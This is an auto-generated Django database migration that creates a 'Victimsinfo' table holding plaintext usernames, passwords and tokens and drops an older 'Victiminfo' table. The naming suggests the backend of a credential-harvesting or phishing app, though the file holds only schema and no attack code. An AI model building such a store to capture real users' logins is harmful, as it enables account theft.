# Generated by Django 3.0.8 on 2020-07-23 12:15

from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        ('home', '0008_auto_20200723_1741'),
    ]

    operations = [
        migrations.CreateModel(
            name='Victimsinfo',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('username', models.CharField(max_length=100)),
                ('password', models.CharField(max_length=100)),
                ('token', models.CharField(max_length=100)),
            ],
        ),
        migrations.DeleteModel(
            name='Victiminfo',
        ),
    ]